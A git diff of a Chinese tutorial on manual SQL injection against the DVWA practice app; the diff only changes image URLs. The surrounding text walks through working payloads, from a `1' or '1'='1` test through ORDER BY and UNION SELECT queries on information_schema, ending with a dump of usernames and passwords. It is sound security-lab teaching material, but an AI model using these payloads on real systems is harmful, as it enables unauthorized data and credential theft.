@@ -186,21 +186,21 @@ Low级别的代码对来自客户端的参数id没有进行任何的检查与过
 现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。
 **1.判断是否存在注入，注入是字符型还是数字型**
 (1)输入1，查询成功：
-![1-1](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-1.png)
+![1-1](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-1.png)
 
 (2)输入`1' and '1'='2`，查询失败，返回结果为空：
-![1-2](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-2.png)
+![1-2](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-2.png)
 
 (3)输入`1' and '1'='1`，查询成功：
-![1-3](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-3.png)
+![1-3](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-3.png)
 
 (4)输入`1' or '1'='1`，查询成功:
-![1-4](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-4.png)
+![1-4](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-4.png)
 返回了多个结果，说明存在字符型注入。
 
 **2.猜解SQL查询语句中的字段数**
 (1)输入`1' or 1=1 order by 1 #`，查询成功(`#`或`--`表示注释)：
-![1-5](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-5.png)
+![1-5](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-5.png)
 
 SQL **ORDER BY** 子句: 用于对结果集进行排序。根据指定的列对结果集进行排序，默认按照升序对记录进行排序。若希望按照降序对记录进行排序，可以使用 DESC 关键字。`ORDER BY 1` 表示所select的字段按第一个字段排序。
 
@@ -213,7 +213,7 @@ SQL **ORDER BY** 子句: 用于对结果集进行排序。根据指定的列对�
 `${}`: 取出的值直接拼装在SQL语句中;会有安全问题。$方式一般用于传入数据库对象，例如传入表名。
 
 (2)输入`1' or 1=1 order by 2 #`，查询成功:
-![1-6](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-6.png)
+![1-6](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-6.png)
 
 (3)输入`1′ or 1=1 order by 3 #`，查询失败:
 ```
@@ -223,7 +223,7 @@ Unknown column '3' in 'order clause'
 
 **3.确定显示的字段顺序**
 输入`1' union select 1,2 #`，查询成功：
-![1-7](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-7.png)
+![1-7](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-7.png)
 说明执行的SQL语句为`select First name,Surname from 表 where ID='id'`。
 `select 1,2`中的1和2只是为了凑够union关键字前面的那个表的字段数，在sql注入时，在相应位置替换成想要的数据即可。
 
@@ -237,12 +237,12 @@ SELECT column_name(s) FROM table_name2
 ```
 **4.获取当前数据库**
 输入`1′ union select 1,database() #`，查询成功：
-![1-8](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-8.png)
+![1-8](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-8.png)
 说明当前的数据库为`dvwa`。
 
 **5.获取数据库中的表**
 输入`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`，查询成功:
-![1-9](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-9.png)
+![1-9](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-9.png)
 说明数据库dvwa中一共有两个表，`guestbook`与`users`。
 
 **补充：**
@@ -260,10 +260,10 @@ COLUMNS表：给出了表中的列信息。
 
 **6.获取表中的字段名**
 输入`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`，查询成功：
-![1-10](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-10.png)
+![1-10](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-10.png)
 说明`users`表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。
 
 **7.下载数据**
 输入`1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`，查询成功：
-![1-11](http://ou3oh86t1.bkt.clouddn.com/SQL%E6%B3%A8%E5%85%A5/1-11.png)
+![1-11](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/SQL%E6%B3%A8%E5%85%A5/1-11.png)
 这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。
